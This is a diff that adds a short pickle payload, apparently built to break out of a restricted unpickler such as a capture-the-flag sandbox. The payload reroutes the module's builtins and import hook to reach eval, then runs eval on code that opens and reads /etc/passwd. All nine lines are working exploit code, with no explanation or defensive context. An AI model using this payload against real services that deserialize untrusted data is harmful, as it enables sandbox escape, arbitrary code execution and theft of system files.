@@ -1,0 +1,9 @@
+__dict__ = GLOBAL('structs', '__dict__')
+builtins = GLOBAL('structs', '__builtins__')
+gtat = GLOBAL('structs', '__getattribute__')
+builtins['__import__'] = gtat
+__dict__['structs'] = builtins
+builtin_get = GLOBAL('structs', 'get')
+eval = builtin_get('eval')
+eval('open("/etc/passwd").read()')
+return
